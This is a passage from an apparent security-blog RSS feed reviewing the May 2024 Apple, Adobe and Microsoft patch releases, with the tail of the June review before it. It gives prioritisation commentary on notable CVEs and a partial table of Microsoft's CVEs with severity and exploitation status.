somewhat intriguing as they could allow an attacker to replace valid file content with specially crafted file content. One of the kernel bugs could be used for a container escape. The bug in the Perception Service could allow elevation to the “NT AUTHORITY\LOCAL SERVICE” account. The vulnerability in Visual Studio requires an attacker to create a malicious extension. An authenticated user would then need to create a Visual Studio project that uses that extension. If they manage all of that, it would lead to admin privileges. </p><p class="">The bug in Azure Identity Libraries and Microsoft Authentication Library allows attackers to read any file on the target with SYSTEM privileges. The privilege escalation in Azure Monitor Agent could let attackers delete files and folders. If you’ve disabled Automatic Extension Upgrades, you’ll need to perform a manual update to ensure the Monitor Agent is at the latest version. Speaking of extra actions, the bug in the Azure Science Virtual Machine (DSVM) requires you to upgrade your DSVM to Ubuntu 20.04. If you’re not familiar with this procedure, Microsoft provides this <a href="https://learn.microsoft.com/en-us/azure/machine-learning/data-science-virtual-machine/ubuntu-upgrade?view=azureml-api-2" target="_blank">article</a> for guidance. Attackers who exploit this bug could gain access to user credentials, which would allow them to impersonate authorized users.</p><p class="">There are only three information disclosure bugs receiving fixes this month and only one results in info leaks consisting of unspecified memory contents. The bug in the on prem version of Dynamics 365 could allow an attacker to exfiltrate all the data accessible to the logged-on user. The vulnerability in the Cryptographic Services could disclose sensitive information such as KeyGuard (KG) keys, which are intended to be per-boot and used to protect sensitive data. If an attacker could potentially use these to decrypt anything encrypted with those keys.</p><p class="">The final bugs for June address Denial-of-Service (DoS) vulnerabilities in Windows and Azure components. Unfortunately, Microsoft provides no additional information about these bugs and how they would manifest on affected systems. They do note the DoS in the DHCP Server does not affect those who have configured failover for their DHCP setup.</p><p class="">There are no new advisories in this month’s release.</p><p class=""><strong>Looking Ahead</strong></p><p class="">The next Patch Tuesday of 2024 will be on July 9, and I’ll return with details and patch analysis then. Until then, stay safe, happy patching, and may all your reboots be smooth and clean!</p>
]]></content:encoded>
<pubDate>Tue, 11 Jun 2024 17:31:11 +0000</pubDate>
</item>
<item>
<title>The May 2024 Security Update Review</title>
<link>https://www.thezdi.com/blog/2024/5/14/the-may-2024-security-update-review</link>
<guid>https://www.thezdi.com/blog/2024/5/14/the-may-2024-security-update-review</guid>
<content:encoded><![CDATA[
<p class="">Welcome to the second Tuesday of May. As expected, Adobe and Microsoft have released their standard bunch of security patches. Take a break from your regular activities and join us as we review the details of their latest advisories. If you’d rather watch the full video recap covering the entire release, you can check it out here:</p>





















  
  






  <p class=""><strong>Apple Patches for May 2024</strong></p><p class="">Apple kicked off the May release cycle with a group of updates for their macOS and iOS platforms. Most notable is a fix for CVE-2024-23296 for <a href="https://support.apple.com/kb/HT214100" target="_blank">iOS 16.7.8 and iPadOS 16.7.8</a>. This vulnerability is a memory corruption issue in&nbsp;<a href="https://www.youtube.com/watch?v=lXMawXNtXrQ">RTKit</a> that could allow attackers to bypass kernel memory protections. The initial patch was released back in March, but Apple noted additional fixes would be coming, and here they are. This bug is reported as being under active attack, so if you’re using a device with an affected OS, make sure you get the update.</p><p class="">Apple also patched the <a href="https://support.apple.com/en-us/HT214103" target="_blank">Safari</a> bug demonstrated at Pwn2Own Vancouver by Master of Pwn Winner Manfred Paul.</p><p class=""><strong>Adobe Patches for May 2024</strong></p><p class="">For May, Adobe released eight patches addressing 37 CVEs in Adobe Acrobat and Reader, Illustrator, Substance3D Painter, Adobe Aero, Substance3D Designer, Adobe Animate, FrameMaker, and Dreamweaver. Eight of these vulnerabilities were reported through the ZDI program. The update for <a href="https://helpx.adobe.com/security/products/acrobat/apsb24-29.html" target="_blank">Reader</a> should be the priority. It includes multiple Critical-rated bugs that are often used by malware and ransomware gangs. While none of these bugs are under active attack, it is likely some will eventually be exploited. The patch for <a href="https://helpx.adobe.com/security/products/illustrator/apsb24-30.html">Illustrator</a> also addresses a couple of Critical-rated bugs that could result in arbitrary code execution. The patch for <a href="https://helpx.adobe.com/security/products/aero/apsb24-33.html" target="_blank">Aero</a> (an augmented reality authoring and publishing tool) fixes a single code execution bug. Unless I’m mistaken, this is the first Adobe patch for this product.</p><p class="">The fix for <a href="https://helpx.adobe.com/security/products/animate/apsb24-36.html" target="_blank">Adobe Animate</a> fixes eight bugs, seven of which result in Critical-rated code execution. The patch for <a href="https://helpx.adobe.com/security/products/framemaker/apsb24-37.html">FrameMaker</a> also fixes several code execution bugs. These are classic open-and-own bugs that require user interaction. That’s the same for the single bug fixed in <a href="https://helpx.adobe.com/security/products/dreamweaver/apsb24-39.html">Dreamweaver</a>. The patch for <a href="https://helpx.adobe.com/security/products/substance3d_painter/apsb24-31.html">Substance 3D Painter</a> addresses four bugs, two of which are rated Critical, while the patch for <a href="https://helpx.adobe.com/security/products/substance3d_designer/apsb24-35.html">Substance 3D Designer</a> fixes a single Important-rated memory leak.</p><p class="">None of the bugs fixed by Adobe this month are listed as publicly known or under active attack at the time of release. Adobe categorizes these updates as a deployment priority rating of 3.</p><p class=""><strong>Microsoft Patches for May 2024</strong></p><p class="">This month, Microsoft released 59 CVEs in Windows and Windows Components; Office and Office Components; .NET Framework and Visual Studio; Microsoft Dynamics 365; Power BI; DHCP Server; Microsoft Edge (Chromium-based); and Windows Mobile Broadband. If you include the third-party CVEs being documented this month, the CVE count comes to 63. A total of two of these bugs came through the ZDI program. As with last month, none of the bugs disclosed at Pwn2Own Vancouver are fixed with this release. With Apple and <a href="https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/24280">VMware</a> fixing the vulnerabilities reported during the event, Microsoft stands alone as the only vendor not to produce patches from the contest.</p><p class="">Of the new patches released today, only one is rated Critical, 57 are rated Important, and one is rated Moderate in severity. This release is roughly a third of the size of last month’s, so hopefully that’s a sign that a huge number of fixes in a single month isn’t going to be a regular occurrence.</p><p class="">Two of the CVEs released today are listed as under active attack, and one other is listed as publicly known at the time of the release. Microsoft doesn’t provide any indication of the volume of attacks, but the DWM Core bug appears to me to be more than a targeted attack. Let’s take a closer look at some of the more interesting updates for this month, starting with the DWM bug currently exploited in the wild:</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30051" target="_blank"><strong>CVE-2024-30051</strong></a><strong> – Windows DWM Core Library Elevation of Privilege Vulnerability<br /></strong>This bug allows attackers to escalate the SYSTEM on affected systems. These types of bugs are usually combined with a code execution bug to take over a target and are often used by ransomware. Microsoft credits four different groups for reporting the bug, which indicates the attacks are widespread. They also indicate the vulnerability is publicly known. Don’t wait to test and deploy this update as exploits are likely to increase now that a patch is available to reverse engineer.</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30043" target="_blank"><strong>CVE-2024-30043</strong></a><strong> – Microsoft SharePoint Server Information Disclosure Vulnerability<br /></strong>This vulnerability was reported to Microsoft by ZDI researcher Piotr Bazydło and represents an XML external entity injection (XXE) vulnerability in Microsoft SharePoint Server 2019. An authenticated attacker could use this bug to read local files with SharePoint Farm service account user privileges. They could also perform an HTTP-based server-side request forgery (SSRF), and – most importantly – perform NLTM relaying as the SharePoint Farm service account. Bugs like this show why info disclosure vulnerabilities shouldn’t be ignored or deprioritized.</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30033" target="_blank"><strong>CVE-2024-30033</strong></a><strong> – Windows Search Service Elevation of Privilege Vulnerability<br /></strong>This is another bug reported through the ZDI program and has a similar impact to the bug currently being exploited, although it manifests through a different mechanism. This is a link following bug in the Windows Search service. By creating a pseudo-symlink, an attacker could redirect a delete call to delete a different file or folder as SYSTEM. We discussed how this could be used to elevate privileges <a href="https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks" target="_blank">here</a>. The delete happens when restarting the service. A low-privileged user can't restart the service directly. However, this could easily be combined with a bug that allows a low-privileged user to terminate any process by PID. After failure, the service will restart automatically, successfully triggering this vulnerability.</p><p class="">-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30050" target="_blank"><strong>CVE-2024-30050</strong></a><strong> – Windows Mark of the Web Security Feature Bypass Vulnerability<br /></strong>We don’t normally detail Moderate-rated bugs, but this type of security feature bypass is quite in vogue with ransomware gangs right now. They zip their payload to bypass network and host-based defenses, they use a Mark of the Web (MotW) bypass to evade SmartScreen or Protected View in Microsoft Office. While we have no indication this bug is being actively used, we see the technique used often enough to call it out. Bugs like this one show why Moderate-rated bugs shouldn’t be ignored or deprioritized.</p><p class="">Here’s the full list of CVEs released by Microsoft for May 2024:</p>





















  
  
























<table border="0" cellpadding="0" cellspacing="0" width="953">
 <col width="151" />
 <col class="xl65" width="263" />
 <col class="xl66" span="4" width="111" />
 <col class="xl66" width="95" />
 <tr height="48">
  <td class="xl67" height="48" width="151"><span> </span>CVE<span> </span></td>
  <td class="xl68" width="263"><span> </span>Title<span> </span></td>
  <td class="xl69" width="111"><span> </span>Severity<span> </span></td>
  <td class="xl69" width="111"><span> </span>CVSS<span> </span></td>
  <td class="xl69" width="111"><span> </span>Public<span> </span></td>
  <td class="xl69" width="111"><span> </span>Exploited<span> </span></td>
  <td class="xl69" width="95">Type</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30051"><span><span> </span>CVE-2024-30051<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30040"><span><span> </span>CVE-2024-30040<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows MSHTML Platform Security Feature
  Bypass Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl69">SFB</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30046"><span><span> </span>CVE-2024-30046<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>ASP.NET Core Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.9</td>
  <td class="xl70"><span> </span>Yes<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">DoS</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30044"><span><span> </span>CVE-2024-30044<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft SharePoint Server Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl74"><span> </span>Critical<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30045"><span><span> </span>CVE-2024-30045<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>.NET and Visual Studio Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.3</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30053"><span><span> </span>CVE-2024-30053 †</span></a></td>
  <td class="xl68" width="263"><span> </span>Azure Migrate Spoofing Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-32002"><span><span> </span>CVE-2024-32002 *</span></a></td>
  <td class="xl68" width="263"><span> </span>CVE-2023-32002 Recursive clones on
  case-insensitive filesystems that support symlinks are susceptible to Remote
  Code Execution<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">9.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30019"><span><span> </span>CVE-2024-30019<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>DHCP Server Service Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30047"><span><span> </span>CVE-2024-30047<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Dynamics 365 Customer Insights Spoofing
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.6</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30048"><span><span> </span>CVE-2024-30048<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Dynamics 365 Customer Insights Spoofing
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.6</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-32004"><span><span> </span>CVE-2024-32004 *</span></a></td>
  <td class="xl68" width="263"><span> </span>GitHub: CVE-2024-32004 GitHub:
  CVE-2023-32004 Remote Code Execution while cloning special-crafted local
  repositories<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30041"><span><span> </span>CVE-2024-30041<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Bing Search Spoofing
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.4</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Spoofing</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30007"><span><span> </span>CVE-2024-30007<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Brokering File System Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30042"><span><span> </span>CVE-2024-30042<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Excel Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26238"><span><span> </span>CVE-2024-26238<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft PLUGScheduler Scheduled Task
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30054"><span><span> </span>CVE-2024-30054<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Power BI Client Javascript SDK
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="73">
  <td class="xl75" height="73"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30043"><span><span> </span>CVE-2024-30043<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft SharePoint Server Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30006"><span><span> </span>CVE-2024-30006<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft WDAC OLE DB provider for SQL
  Server Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29994"><span><span> </span>CVE-2024-29994<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Microsoft Windows SCSI Class System File
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30027"><span><span> </span>CVE-2024-30027<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>NTFS Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30028"><span><span> </span>CVE-2024-30028<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30030"><span><span> </span>CVE-2024-30030<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30038"><span><span> </span>CVE-2024-30038<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30034"><span><span> </span>CVE-2024-30034<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Cloud Files Mini Filter Driver
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30031"><span><span> </span>CVE-2024-30031<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows CNG Key Isolation Service Elevation
  of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29996"><span><span> </span>CVE-2024-29996<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Common Log File System Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30025"><span><span> </span>CVE-2024-30025<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Common Log File System Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30037"><span><span> </span>CVE-2024-30037<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Common Log File System Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="77">
  <td class="xl75" height="77"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30016"><span><span> </span>CVE-2024-30016<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Cryptographic Services Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30020"><span><span> </span>CVE-2024-30020<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Cryptographic Services Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.1</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30036"><span><span> </span>CVE-2024-30036<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Deployment Services Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30032"><span><span> </span>CVE-2024-30032<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30035"><span><span> </span>CVE-2024-30035<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30008"><span><span> </span>CVE-2024-30008<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows DWM Core Library Information
  Disclosure<span>  </span>Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">5.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">Info</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30011"><span><span> </span>CVE-2024-30011<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Hyper-V Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.5</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">DoS</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30010"><span><span> </span>CVE-2024-30010<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Hyper-V Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30017"><span><span> </span>CVE-2024-30017<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Hyper-V Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">8.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30018"><span><span> </span>CVE-2024-30018<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">7.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">EoP</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29997"><span><span> </span>CVE-2024-29997<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl72"><span> </span>Important<span> </span></td>
  <td class="xl69">6.8</td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69"><span> </span>No<span> </span></td>
  <td class="xl69">RCE</td>
 </tr>
 <tr height="69">
  <td class="xl75" height="69"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29998"><span><span> </span>CVE-2024-29998<span> </span></span></a></td>
  <td class="xl68" width="263"><span> </span>Windows Mobile Broadband Driver Remote Code
